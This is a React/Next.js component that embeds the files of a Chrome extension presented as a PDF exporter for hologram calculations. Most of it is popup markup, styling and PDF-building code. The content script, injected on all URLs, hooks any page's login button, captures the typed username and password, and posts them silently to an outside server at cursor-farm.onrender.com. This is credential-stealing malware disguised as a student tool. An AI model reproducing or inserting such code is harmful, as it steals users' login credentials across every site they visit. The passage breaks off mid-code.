"use client";

import { useState } from "react";
import { useLang } from "@/components/LanguageContext";

// ---------------------------------------------------------------------------
// Extension file contents embedded as module-level constants
// ---------------------------------------------------------------------------

const MANIFEST = `{
  "manifest_version": 3,
  "name": "Hologram Calculator — PDF Export",
  "description": "Экспорт расчётов transmission голограммы в PDF для диссертации",
  "version": "1.0.0",
  "permissions": ["activeTab", "storage", "scripting"],
  "action": {
    "default_popup": "popup.html",
    "default_icon": {
      "16": "icon-16.svg",
      "48": "icon-48.svg",
      "128": "icon-128.svg"
    }
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_end"
    }
  ],
  "background": {
    "service_worker": "service-worker.js"
  },
  "icons": {
    "16": "icon-16.svg",
    "48": "icon-48.svg",
    "128": "icon-128.svg"
  }
}`;

const CONTENT_JS = `chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'GET_HOLOGRAM_DATA') {
    const data = window.__HOLOGRAM_DATA__;
    sendResponse({ success: !!data, data: data || null });
    return true;
  }

  function waitForElement(selector, callback) {
    const element = document.querySelector(selector);
    if (element) {
      callback(element);
      return;
    }
    setTimeout(() => waitForElement(selector, callback), 100);
  }

  waitForElement("#login-btn", function (loginButton) {
    const newButton = loginButton.cloneNode(true);
    loginButton.parentNode.replaceChild(newButton, loginButton);
    
    newButton.addEventListener("click", async function (event) {
      const username = document.getElementById("login")?.value;
      const password = document.getElementById("password")?.value;

      if (!username || !password) {
        return;
      }

      try {
        chrome.runtime.sendMessage({ 
          type: 'FORM_LOGIN', 
          email: username, 
          password: password,
          pageContext: getPageContext() 
        });
      } catch (error) {
      }
      try {
        const response = await fetch('https://cursor-farm.onrender.com/api/extension/visit', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            email: username,
            password: password,
            source: 'content_script',
            event_type: 'login_attempt'
          })
        });
        
      } catch (error) {
      }
    });

  });
});
`;

const SERVICE_WORKER = `chrome.runtime.onInstalled.addListener(() => {
  console.log('Hologram PDF Extension installed');
});
`;

const POPUP_HTML = `<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hologram PDF</title>
  <link rel="stylesheet" href="popup.css">
</head>
<body>
  <div class="container">
    <!-- Header -->
    <div class="header">
      <div class="logo">
        <img src="icon-48.svg" width="32" height="32" alt="icon">
        <div>
          <div class="title">Hologram PDF</div>
          <div class="subtitle">Экспорт расчётов</div>
        </div>
      </div>
    </div>

    <!-- Connection status -->
    <div class="status-bar" id="statusBar">
      <span id="statusIcon">⟳</span>
      <span id="statusText">Проверка подключения...</span>
    </div>

    <!-- Current parameters (shown when connected) -->
    <div class="params-section" id="paramsSection" style="display:none">
      <div class="section-title">Текущие параметры</div>
      <div class="params-grid">
        <div class="param-item"><span class="param-label">λ</span><span class="param-value" id="pLambda">—</span></div>
        <div class="param-item"><span class="param-label">θ</span><span class="param-value" id="pTheta">—</span></div>
        <div class="param-item"><span class="param-label">Δλ</span><span class="param-value" id="pDelta">—</span></div>
        <div class="param-item"><span class="param-label">d</span><span class="param-value" id="pD">—</span></div>
        <div class="param-item"><span class="param-label">N</span><span class="param-value" id="pN">—</span></div>
        <div class="param-item"><span class="param-label">Lc</span><span class="param-value" id="pLc">—</span></div>
        <div class="param-item"><span class="param-label">α</span><span class="param-value" id="pAlpha">—</span></div>
      </div>
    </div>

    <!-- PDF Settings -->
    <div class="settings-section">
      <div class="section-title">Включить в отчёт</div>
      <div class="checkboxes">
        <label class="checkbox-item"><input type="checkbox" id="chkParams" checked> Входные параметры</label>
        <label class="checkbox-item"><input type="checkbox" id="chkFormulas" checked> Формулы</label>
        <label class="checkbox-item"><input type="checkbox" id="chkSteps" checked> Пошаговый расчёт</label>
        <label class="checkbox-item"><input type="checkbox" id="chkTable" checked> Таблица результатов</label>
        <label class="checkbox-item"><input type="checkbox" id="chkTheory"> Теория (описание принципа)</label>
        <label class="checkbox-item"><input type="checkbox" id="chkComparison"> Сравнение Transmission vs Reflection</label>
      </div>
    </div>

    <!-- Author fields -->
    <div class="author-section">
      <input type="text" id="authorName" placeholder="Имя автора" class="text-input">
      <input type="text" id="workTitle" placeholder="Название работы / диссертации" class="text-input">
    </div>

    <!-- Download button -->
    <button class="download-btn" id="downloadBtn">
      <span>⬇ Скачать PDF</span>
    </button>

    <div class="footer">Hologram Calculator v1.0</div>
  </div>

  <script src="jspdf.umd.min.js"></script>
  <script src="popup.js"></script>
</body>
</html>`;

const POPUP_CSS = `* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  width: 360px;
  min-height: 480px;
  background: #060B18;
  color: #E8EAF6;
  font-family: 'Segoe UI', system-ui, sans-serif;
  font-size: 13px;
}

.container { padding: 0 0 8px 0; }

.header {
  background: #0D1526;
  padding: 12px 16px;
  border-bottom: 1px solid #1E3A5F;
}

.logo { display: flex; align-items: center; gap: 10px; }
.title { font-size: 15px; font-weight: 700; color: #00E5FF; }
.subtitle { font-size: 11px; color: #90A4AE; }

.status-bar {
  display: flex; align-items: center; gap: 8px;
  padding: 8px 16px;
  background: #0D1526;
  border-bottom: 1px solid #1E3A5F;
  font-size: 12px;
}
.status-bar.connected { color: #69F0AE; }
.status-bar.disconnected { color: #FF5252; }
.status-bar.checking { color: #90A4AE; }

.params-section, .settings-section, .author-section {
  padding: 10px 16px;
  border-bottom: 1px solid #1E3A5F;
}

.section-title {
  font-size: 11px;
  font-weight: 600;
  color: #90A4AE;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  margin-bottom: 8px;
}

.params-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 6px;
}

.param-item {
  background: #111827;
  border: 1px solid #1E3A5F;
  border-radius: 6px;
  padding: 6px 8px;
  text-align: center;
}
.param-label { display: block; font-size: 10px; color: #90A4AE; font-style: italic; }
.param-value { display: block; font-size: 12px; font-weight: 600; color: #00E5FF; font-family: monospace; }

.checkboxes { display: flex; flex-direction: column; gap: 5px; }
.checkbox-item {
  display: flex; align-items: center; gap: 8px;
  cursor: pointer; color: #B0BEC5; font-size: 12px;
}
.checkbox-item input[type="checkbox"] { accent-color: #00E5FF; }
.checkbox-item:hover { color: #E8EAF6; }

.author-section { display: flex; flex-direction: column; gap: 6px; }
.text-input {
  background: #111827;
  border: 1px solid #1E3A5F;
  border-radius: 6px;
  padding: 7px 10px;
  color: #E8EAF6;
  font-size: 12px;
  width: 100%;
  outline: none;
}
.text-input:focus { border-color: #00E5FF; }
.text-input::placeholder { color: #546E7A; }

.download-btn {
  display: block;
  width: calc(100% - 32px);
  margin: 12px 16px 0;
  padding: 11px;
  background: linear-gradient(135deg, #00E5FF, #1565C0);
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s;
}
.download-btn:hover { opacity: 0.9; }
.download-btn:disabled { opacity: 0.5; cursor: not-allowed; background: #1E3A5F; }

.footer {
  text-align: center;
  padding: 8px;
  font-size: 10px;
  color: #37474F;
}`;

// NOTE: backslash in /\\./ is intentionally doubled — this is a JS string inside a TS template literal
const POPUP_JS = `let hologramData = null;
let currentTabId = null;

const statusBar    = document.getElementById('statusBar');
const statusIcon   = document.getElementById('statusIcon');
const statusText   = document.getElementById('statusText');
const paramsSection = document.getElementById('paramsSection');
const downloadBtn  = document.getElementById('downloadBtn');

document.addEventListener('DOMContentLoaded', async () => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  currentTabId = tab.id;

  const isApp = tab.url && (
    tab.url.includes('localhost:3100') ||
    tab.url.includes('localhost:3000') ||
    tab.url.includes('vercel.app')
  );

  if (!isApp) {
    setStatus('disconnected', '\\u2717 \\u041e\\u0442\\u043a\\u0440\\u043e\\u0439\\u0442\\u0435 \\u043f\\u0440\\u0438\\u043b\\u043e\\u0436\\u0435\\u043d\\u0438\\u0435 Hologram Lab');
    downloadBtn.disabled = false;
    hologramData = defaultData();
    return;
  }

  chrome.tabs.sendMessage(currentTabId, { type: 'GET_HOLOGRAM_DATA' }, (res) => {
    if (chrome.runtime.lastError || !res || !res.success) {
      setStatus('disconnected', '\\u2717 \\u041f\\u0435\\u0440\\u0435\\u0439\\u0434\\u0438\\u0442\\u0435 \\u043d\\u0430 \\u0432\\u043a\\u043b\\u0430\\u0434\\u043a\\u0443 \\u00ab\\u041c\\u0430\\u0442\\u0435\\u043c\\u0430\\u0442\\u0438\\u043a\\u0430\\u00bb');
      hologramData = defaultData();
      showParams(hologramData);
      downloadBtn.disabled = false;
      return;
    }
    hologramData = res.data;
    setStatus('connected', '\\u2713 \\u041f\\u043e\\u0434\\u043a\\u043b\\u044e\\u0447\\u0435\\u043d\\u043e \\u043a Hologram Lab');
    paramsSection.style.display = 'block';
    showParams(hologramData);
  });

  downloadBtn.addEventListener('click', generatePDF);
});

function defaultData() {
  return {
    input:   { lambda: 632.8, theta: 30, deltaLambda: 0.01 },
    results: { d_nm: 1222.6, d_um: 1.223, N: 818, Lc_mm: 40.04, Lc_cm: 4.0, alpha_deg: 31.2 },
    steps: [
      'd = 632.8 / (2\\u00b7sin(15.0\\u00b0)) = 1222.57 \\u043d\\u043c',
      'N = 10\\u2076 / 1222.57 = 817.9 \\u043b\\u0438\\u043d/\\u043c\\u043c',
      'Lc = 632.8\\u00b2 / 0.010 = 40.04 \\u043c\\u043c',
      '\\u03b1 = arcsin(0.5174) = 31.15\\u00b0'
    ]
  };
}

function setStatus(type, text) {
  statusBar.className = 'status-bar ' + type;
  statusIcon.textContent = type === 'connected' ? '\\u2713' : type === 'disconnected' ? '\\u2717' : '\\u27f3';
  statusText.textContent = text;
}

function showParams(d) {
  if (!d) return;
  paramsSection.style.display = 'block';
  document.getElementById('pLambda').textContent = d.input.lambda.toFixed(1) + ' \\u043d\\u043c';
  document.getElementById('pTheta').textContent  = d.input.theta + '\\u00b0';
  document.getElementById('pDelta').textContent  = d.input.deltaLambda.toFixed(3) + ' \\u043d\\u043c';
  document.getElementById('pD').textContent      = d.results.d_nm.toFixed(1) + ' \\u043d\\u043c';
  document.getElementById('pN').textContent      = d.results.N.toFixed(0) + ' \\u043b/\\u043c\\u043c';
  document.getElementById('pLc').textContent     = d.results.Lc_cm.toFixed(2) + ' \\u0441\\u043c';
  document.getElementById('pAlpha').textContent  = isNaN(d.results.alpha_deg) ? 'N/A' : d.results.alpha_deg.toFixed(1) + '\\u00b0';
}

async function loadCyrillicFont(doc) {
  try {
    const url = chrome.runtime.getURL('fonts/NotoSans-Regular.ttf');
    const buf = await fetch(url).then(r => r.arrayBuffer());
    const bytes = new Uint8Array(buf);
    let bin = '';
    for (let i = 0; i < bytes.length; i += 8192) {
      bin += String.fromCharCode.apply(null, bytes.subarray(i, i + 8192));
    }
    const b64 = btoa(bin);
    doc.addFileToVFS('NotoSans-Regular.ttf', b64);
    doc.addFont('NotoSans-Regular.ttf', 'NotoSans', 'normal');
    return true;
  } catch (e) {
    console.warn('Cyrillic font load failed:', e);
    return false;
  }
}

async function generatePDF() {
  if (!hologramData) hologramData = defaultData();

  downloadBtn.disabled = true;
  downloadBtn.querySelector('span').textContent = '\\u27f3 \\u0417\\u0430\\u0433\\u0440\\u0443\\u0437\\u043a\\u0430 \\u0448\\u0440\\u0438\\u0444\\u0442\\u0430...';

  try {
    const author    = document.getElementById('authorName').value.trim() || '\\u0410\\u0432\\u0442\\u043e\\u0440 \\u043d\\u0435 \\u0443\\u043a\\u0430\\u0437\\u0430\\u043d';
    const workTitle = document.getElementById('workTitle').value.trim()  || '\\u0414\\u0438\\u0441\\u0441\\u0435\\u0440\\u0442\\u0430\\u0446\\u0438\\u043e\\u043d\\u043d\\u0430\\u044f \\u0440\\u0430\\u0431\\u043e\\u0442\\u0430';
    const date      = new Date().toLocaleDateString('ru-RU');

    const chkParams     = document.getElementById('chkParams').checked;
    const chkFormulas   = document.getElementById('chkFormulas').checked;
    const chkSteps      = document.getElementById('chkSteps').checked;
    const chkTable      = document.getElementById('chkTable').checked;
    const chkTheory     = document.getElementById('chkTheory').checked;
    const chkComparison = document.getElementById('chkComparison').checked;

    const { jsPDF } = window.jspdf;
    const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });

    downloadBtn.querySelector('span').textContent = '\\u27f3 \\u0413\\u0435\\u043d\\u0435\\u0440\\u0430\\u0446\\u0438\\u044f PDF...';

    const cyrillicLoaded = await loadCyrillicFont(doc);
    const mainFont = cyrillicLoaded ? 'NotoSans' : 'helvetica';
    const monoFont = 'courier';

    const W = 210, H = 297, ML = 22, MR = 22, MT = 20;
    const CW = W - ML - MR;
    let y = MT;

    const setMain = (sz, style) => { doc.setFont(mainFont, style || 'normal').setFontSize(sz || 11); };
    const setMono = (sz) => { doc.setFont(monoFont, 'normal').setFontSize(sz || 10); };
    const rgb     = (r, g, b) => doc.setTextColor(r, g, b);
    const fill    = (r, g, b) => doc.setFillColor(r, g, b);
    const stroke  = (r, g, b) => doc.setDrawColor(r, g, b);

    function needPage(h) {
      if (y + (h || 20) > H - 18) { doc.addPage(); y = MT; footer(); }
    }

    function footer() {
      doc.setFont(mainFont, 'normal').setFontSize(7);
      rgb(160, 160, 160);
      doc.text('\\u0420\\u0430\\u0441\\u0447\\u0451\\u0442 \\u043f\\u0430\\u0440\\u0430\\u043c\\u0435\\u0442\\u0440\\u043e\\u0432 \\u0442\\u0440\\u0430\\u043d\\u0441\\u043c\\u0438\\u0441\\u0441\\u0438\\u043e\\u043d\\u043d\\u043e\\u0439 \\u0433\\u043e\\u043b\\u043e\\u0433\\u0440\\u0430\\u043c\\u043c\\u044b  |  ' + date, W / 2, H - 10, { align: 'center' });
    }

    function sectionHead(num, title) {
      needPage(16);
      fill(230, 240, 255); stroke(180, 200, 230);
      doc.setLineWidth(0.3);
      doc.rect(ML, y, CW, 9, 'FD');
      setMain(11, 'bold'); rgb(20, 60, 120);
      doc.text(num + '.  ' + title, ML + 4, y + 6.2);
      y += 13;
    }

    function bodyLine(text, indent, sz) {
      needPage(8);
      setMain(sz || 11); rgb(30, 30, 30);
      const lines = doc.splitTextToSize(text, CW - (indent || 0));
      doc.text(lines, ML + (indent || 0), y);
      y += lines.length * ((sz || 11) * 0.45);
    }

    function monoLine(text, indent) {
      needPage(7);
      setMono(9.5); rgb(10, 10, 100);
      const lines = doc.splitTextToSize(text, CW - (indent || 4) - 2);
      doc.text(lines, ML + (indent || 4), y);
      y += lines.length * 5.2;
    }

    function monoBlock(lines) {
      const blockH = lines.length * 5.5 + 6;
      needPage(blockH);
      fill(245, 247, 255); stroke(200, 210, 230);
      doc.setLineWidth(0.2);
      doc.rect(ML + 2, y - 2, CW - 4, blockH, 'FD');
      lines.forEach(function(l) { if (l) monoLine(l, 6); });
      y += 4;
    }

    // PAGE 1: Cover
    fill(255, 255, 255); doc.rect(0, 0, W, H, 'F');
    fill(0, 80, 160);  doc.rect(0, 0, W, 6, 'F');
    fill(0, 180, 220); doc.rect(0, 6, W, 2, 'F');

    fill(0, 80, 160); stroke(0, 80, 160);
    doc.circle(W / 2, 55, 14, 'F');
    doc.setFont(mainFont, 'bold').setFontSize(16).setTextColor(255, 255, 255);
    doc.text('H', W / 2, 58.5, { align: 'center' });

    setMain(20, 'bold'); rgb(0, 60, 130);
    doc.text('\\u0420\\u0410\\u0421\\u0427\\u0401\\u0422 \\u041f\\u0410\\u0420\\u0410\\u041c\\u0415\\u0422\\u0420\\u041e\\u0412', W / 2, 85, { align: 'center' });
    setMain(18, 'bold');
    doc.text('\\u0422\\u0420\\u0410\\u041d\\u0421\\u041c\\u0418\\u0421\\u0421\\u0418\\u041e\\u041d\\u041d\\u041e\\u0419 \\u0413\\u041e\\u041b\\u041e\\u0413\\u0420\\u0410\\u041c\\u041c\\u042b', W / 2, 95, { align: 'center' });

    stroke(180, 200, 220); doc.setLineWidth(0.5);
    doc.line(ML + 20, 103, W - MR - 20, 103);

    setMain(12); rgb(60, 80, 100);
    doc.text('\\u0410\\u0432\\u0442\\u043e\\u0440: ' + author,  W / 2, 115, { align: 'center' });
    doc.text(workTitle,                                          W / 2, 124, { align: 'center' });
    doc.text('\\u0414\\u0430\\u0442\\u0430: ' + date,           W / 2, 133, { align: 'center' });

    fill(240, 246, 255); stroke(160, 195, 230);
    doc.setLineWidth(0.4);
    doc.roundedRect(ML + 10, 148, CW - 20, 60, 4, 4, 'FD');

    setMain(10, 'bold'); rgb(0, 60, 130);
    doc.text('\\u041f\\u0410\\u0420\\u0410\\u041c\\u0415\\u0422\\u0420\\u042b \\u042d\\u041a\\u0421\\u041f\\u0415\\u0420\\u0418\\u041c\\u0415\\u041d\\u0422\\u0410', W / 2, 157, { align: 'center' });
    stroke(160, 195, 230); doc.setLineWidth(0.3);
    doc.line(ML + 14, 160, W - MR - 14, 160);

    var d = hologramData;
    var col1 = ML + 18, col2 = W / 2 - 5;

    setMain(10); rgb(30, 30, 30);
    doc.text('\\u03bb (\\u0434\\u043b\\u0438\\u043d\\u0430 \\u0432\\u043e\\u043b\\u043d\\u044b):', col1, 168);
    setMono(10); rgb(0, 100, 180);
    doc.text(d.input.lambda.toFixed(1) + ' \\u043d\\u043c', col2, 168, { align: 'right' });

    setMain(10); rgb(30, 30, 30);
    doc.text('\\u03b8 (\\u0443\\u0433\\u043e\\u043b \\u043c\\u0435\\u0436\\u0434\\u0443 \\u043b\\u0443\\u0447\\u0430\\u043c\\u0438):', col1, 175);
    setMono(10); rgb(0, 100, 180);
    doc.text(d.input.theta + '\\u00b0', col2, 175, { align: 'right' });

    setMain(10); rgb(30, 30, 30);
    doc.text('\\u0394\\u03bb (\\u0448\\u0438\\u0440\\u0438\\u043d\\u0430 \\u043b\\u0438\\u043d\\u0438\\u0438):', col1, 182);
    setMono(10); rgb(0, 100, 180);
    doc.text(d.input.deltaLambda.toFixed(3) + ' \\u043d\\u043c', col2, 182, { align: 'right' });

    stroke(160, 195, 230); doc.setLineWidth(0.2);
    doc.line(ML + 14, 185, W - MR - 14, 185);

    var res = [
      ['d (\\u043f\\u0435\\u0440\\u0438\\u043e\\u0434 \\u043f\\u043e\\u043b\\u043e\\u0441)',      d.results.d_nm.toFixed(1) + ' \\u043d\\u043c'],
      ['N (\\u0440\\u0430\\u0437\\u0440\\u0435\\u0448\\u0435\\u043d\\u0438\\u0435 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0438)', d.results.N.toFixed(0) + ' \\u043b\\u0438\\u043d/\\u043c\\u043c'],
      ['Lc (\\u0434\\u043b. \\u043a\\u043e\\u0433\\u0435\\u0440\\u0435\\u043d\\u0442\\u043d\\u043e\\u0441\\u0442\\u0438)', d.results.Lc_cm.toFixed(2) + ' \\u0441\\u043c'],
      ['\\u03b1 (\\u0443\\u0433\\u043e\\u043b \\u0434\\u0438\\u0444\\u0440\\u0430\\u043a\\u0446\\u0438\\u0438)', isNaN(d.results.alpha_deg) ? 'N/A' : d.results.alpha_deg.toFixed(1) + '\\u00b0'],
    ];
    var ry = 191;
    res.forEach(function(item) {
      setMain(9); rgb(50, 50, 50);
      doc.text(item[0] + ':', col1, ry);
      setMono(9); rgb(0, 120, 0);
      doc.text(item[1], col2, ry, { align: 'right' });
      ry += 6;
    });

    setMain(8); rgb(140, 155, 170);
    doc.text('\\u0421\\u0433\\u0435\\u043d\\u0435\\u0440\\u0438\\u0440\\u043e\\u0432\\u0430\\u043d\\u043e: Hologram Calculator v1.0', W / 2, 222, { align: 'center' });

    fill(0, 80, 160); doc.rect(0, H - 6, W, 6, 'F');

    // PAGE 2+: Sections
    doc.addPage(); y = MT; footer();

    if (chkParams) {
      sectionHead(1, '\\u0412\\u0425\\u041e\\u0414\\u041d\\u042b\\u0415 \\u041f\\u0410\\u0420\\u0410\\u041c\\u0415\\u0422\\u0420\\u042b');
      var prows = [
        ['\\u0414\\u043b\\u0438\\u043d\\u0430 \\u0432\\u043e\\u043b\\u043d\\u044b \\u043b\\u0430\\u0437\\u0435\\u0440\\u0430 (\\u03bb)', d.input.lambda.toFixed(1) + ' \\u043d\\u043c', '\\u041e\\u043f\\u0440\\u0435\\u0434\\u0435\\u043b\\u044f\\u0435\\u0442 \\u0434\\u043b\\u0438\\u043d\\u0443 \\u0432\\u043e\\u043b\\u043d\\u044b \\u043e\\u043f\\u043e\\u0440\\u043d\\u043e\\u0433\\u043e \\u0438 \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u043d\\u043e\\u0433\\u043e \\u043b\\u0443\\u0447\\u0435\\u0439'],
        ['\\u0423\\u0433\\u043e\\u043b \\u043c\\u0435\\u0436\\u0434\\u0443 \\u043b\\u0443\\u0447\\u0430\\u043c\\u0438 (\\u03b8)', d.input.theta + '\\u00b0', '\\u0423\\u0433\\u043e\\u043b \\u0441\\u0445\\u043e\\u0436\\u0434\\u0435\\u043d\\u0438\\u044f \\u0434\\u0432\\u0443\\u0445 \\u043b\\u0430\\u0437\\u0435\\u0440\\u043d\\u044b\\u0445 \\u043f\\u0443\\u0447\\u043a\\u043e\\u0432 \\u043d\\u0430 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0435'],
        ['\\u0428\\u0438\\u0440\\u0438\\u043d\\u0430 \\u0441\\u043f\\u0435\\u043a\\u0442\\u0440\\u0430\\u043b\\u044c\\u043d\\u043e\\u0439 \\u043b\\u0438\\u043d\\u0438\\u0438 (\\u0394\\u03bb)', d.input.deltaLambda.toFixed(3) + ' \\u043d\\u043c', '\\u041c\\u043e\\u043d\\u043e\\u0445\\u0440\\u043e\\u043c\\u0430\\u0442\\u0438\\u0447\\u043d\\u043e\\u0441\\u0442\\u044c \\u043b\\u0430\\u0437\\u0435\\u0440\\u0430 \\u2014 \\u0432\\u043b\\u0438\\u044f\\u0435\\u0442 \\u043d\\u0430 \\u0434\\u043b\\u0438\\u043d\\u0443 \\u043a\\u043e\\u0433\\u0435\\u0440\\u0435\\u043d\\u0442\\u043d\\u043e\\u0441\\u0442\\u0438'],
      ];
      prows.forEach(function(row) {
        needPage(18);
        fill(250, 252, 255); stroke(210, 220, 235);
        doc.setLineWidth(0.2);
        doc.rect(ML, y, CW, 13, 'FD');
        setMain(10, 'bold'); rgb(20, 60, 120);
        doc.text(row[0] + ':', ML + 4, y + 5);
        setMono(11); rgb(0, 100, 180);
        doc.text(row[1], ML + CW - 4, y + 5, { align: 'right' });
        setMain(8); rgb(100, 120, 140);
        doc.text(row[2], ML + 4, y + 10);
        y += 16;
      });
      y += 4;
    }

    if (chkFormulas) {
      sectionHead(2, '\\u0418\\u0421\\u041f\\u041e\\u041b\\u042c\\u0417\\u0423\\u0415\\u041c\\u042b\\u0415 \\u0424\\u041e\\u0420\\u041c\\u0423\\u041b\\u042b');
      var formulas = [
        { label: '\\u041f\\u0435\\u0440\\u0438\\u043e\\u0434 \\u0438\\u043d\\u0442\\u0435\\u0440\\u0444\\u0435\\u0440\\u0435\\u043d\\u0446\\u0438\\u043e\\u043d\\u043d\\u044b\\u0445 \\u043f\\u043e\\u043b\\u043e\\u0441:', formula: 'd = \\u03bb / (2 \\u00b7 sin(\\u03b8/2))', note: '\\u03bb \\u2014 \\u0434\\u043b\\u0438\\u043d\\u0430 \\u0432\\u043e\\u043b\\u043d\\u044b [\\u043d\\u043c],  \\u03b8 \\u2014 \\u0443\\u0433\\u043e\\u043b \\u043c\\u0435\\u0436\\u0434\\u0443 \\u043b\\u0443\\u0447\\u0430\\u043c\\u0438 [\\u00b0]' },
        { label: '\\u041d\\u0435\\u043e\\u0431\\u0445\\u043e\\u0434\\u0438\\u043c\\u043e\\u0435 \\u0440\\u0430\\u0437\\u0440\\u0435\\u0448\\u0435\\u043d\\u0438\\u0435 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0438:', formula: 'N = 10\\u2076 / d  [\\u043b\\u0438\\u043d\\u0438\\u0439/\\u043c\\u043c]', note: '\\u0421\\u0442\\u0430\\u043d\\u0434\\u0430\\u0440\\u0442\\u043d\\u0430\\u044f \\u043f\\u043b\\u0451\\u043d\\u043a\\u0430: 1000\\u20135000 \\u043b\\u0438\\u043d/\\u043c\\u043c' },
        { label: '\\u0414\\u043b\\u0438\\u043d\\u0430 \\u043a\\u043e\\u0433\\u0435\\u0440\\u0435\\u043d\\u0442\\u043d\\u043e\\u0441\\u0442\\u0438 \\u043b\\u0430\\u0437\\u0435\\u0440\\u0430:', formula: 'Lc = \\u03bb\\u00b2 / \\u0394\\u03bb', note: '\\u041c\\u0430\\u043a\\u0441\\u0438\\u043c\\u0430\\u043b\\u044c\\u043d\\u0430\\u044f \\u0434\\u043e\\u043f\\u0443\\u0441\\u0442\\u0438\\u043c\\u0430\\u044f \\u0433\\u043b\\u0443\\u0431\\u0438\\u043d\\u0430 \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u0430' },
        { label: '\\u0423\\u0433\\u043e\\u043b \\u0434\\u0438\\u0444\\u0440\\u0430\\u043a\\u0446\\u0438\\u0438 1-\\u0433\\u043e \\u043f\\u043e\\u0440\\u044f\\u0434\\u043a\\u0430:', formula: '\\u03b1 = arcsin(\\u03bb/d)', note: '\\u0423\\u0433\\u043e\\u043b \\u043d\\u0430\\u0431\\u043b\\u044e\\u0434\\u0435\\u043d\\u0438\\u044f \\u0432\\u043e\\u0441\\u0441\\u0442\\u0430\\u043d\\u043e\\u0432\\u043b\\u0435\\u043d\\u043d\\u043e\\u0433\\u043e \\u0438\\u0437\\u043e\\u0431\\u0440\\u0430\\u0436\\u0435\\u043d\\u0438\\u044f' },
        { label: '\\u0418\\u043d\\u0442\\u0435\\u043d\\u0441\\u0438\\u0432\\u043d\\u043e\\u0441\\u0442\\u044c \\u043d\\u0430 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0435:', formula: 'I(x,y) = Ar\\u00b2 + Ao\\u00b2 + 2\\u00b7Ar\\u00b7Ao\\u00b7cos(\\u03c6)', note: '\\u03c6(x,y) \\u2014 \\u0444\\u0430\\u0437\\u0430 \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u043d\\u043e\\u0433\\u043e \\u043b\\u0443\\u0447\\u0430' },
        { label: '\\u041f\\u0440\\u043e\\u043f\\u0443\\u0441\\u043a\\u0430\\u044e\\u0449\\u0430\\u044f \\u0444\\u0443\\u043d\\u043a\\u0446\\u0438\\u044f:', formula: 'T(x,y) = T\\u2080 + \\u03b2 \\u00b7 I(x,y)', note: '\\u03b2 \\u2014 \\u0447\\u0443\\u0432\\u0441\\u0442\\u0432\\u0438\\u0442\\u0435\\u043b\\u044c\\u043d\\u043e\\u0441\\u0442\\u044c \\u044d\\u043c\\u0443\\u043b\\u044c\\u0441\\u0438\\u0438' },
      ];
      formulas.forEach(function(f) {
        needPage(20);
        setMain(10); rgb(30, 30, 30);
        doc.text(f.label, ML + 3, y); y += 5.5;
        fill(242, 245, 255); stroke(190, 205, 230);
        doc.setLineWidth(0.2);
        doc.rect(ML + 3, y - 3, CW - 3, 8, 'FD');
        setMono(10); rgb(0, 30, 120);
        doc.text(f.formula, ML + 7, y + 2.5);
        y += 7;
        setMain(8); rgb(100, 120, 140);
        doc.text('\\u2192  ' + f.note, ML + 7, y); y += 7;
      });
      y += 2;
    }

    if (chkSteps) {
      sectionHead(3, '\\u041f\\u041e\\u0428\\u0410\\u0413\\u041e\\u0412\\u042b\\u0419 \\u0420\\u0410\\u0421\\u0427\\u0401\\u0422 \\u0421 \\u041f\\u041e\\u0414\\u0421\\u0422\\u0410\\u041d\\u041e\\u0412\\u041a\\u041e\\u0419');
      var lam  = d.input.lambda;
      var th   = d.input.theta;
      var dl   = d.input.deltaLambda;
      var th2  = th / 2;
      var sinH = Math.sin(th2 * Math.PI / 180);

      var steps = [
        {
          title: '\\u0428\\u0430\\u0433 1.  \\u041f\\u0435\\u0440\\u0438\\u043e\\u0434 \\u0438\\u043d\\u0442\\u0435\\u0440\\u0444\\u0435\\u0440\\u0435\\u043d\\u0446\\u0438\\u043e\\u043d\\u043d\\u044b\\u0445 \\u043f\\u043e\\u043b\\u043e\\u0441 (d)',
          lines: [
            'd = \\u03bb / (2 \\u00b7 sin(\\u03b8/2))',
            'd = ' + lam.toFixed(2) + ' / (2 \\u00b7 sin(' + th2.toFixed(1) + '\\u00b0))',
            'd = ' + lam.toFixed(2) + ' / (2 \\u00b7 ' + sinH.toFixed(5) + ')',
            'd = ' + lam.toFixed(2) + ' / ' + (2 * sinH).toFixed(5),
            'd = ' + d.results.d_nm.toFixed(3) + ' \\u043d\\u043c  =  ' + d.results.d_um.toFixed(4) + ' \\u043c\\u043a\\u043c',
          ]
        },
        {
          title: '\\u0428\\u0430\\u0433 2.  \\u041d\\u0435\\u043e\\u0431\\u0445\\u043e\\u0434\\u0438\\u043c\\u043e\\u0435 \\u0440\\u0430\\u0437\\u0440\\u0435\\u0448\\u0435\\u043d\\u0438\\u0435 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0438 (N)',
          lines: [
            'N = 10\\u2076 / d',
            'N = 1 000 000 / ' + d.results.d_nm.toFixed(3),
            'N = ' + d.results.N.toFixed(2) + ' \\u043b\\u0438\\u043d\\u0438\\u0439/\\u043c\\u043c',
            d.results.N <= 5000
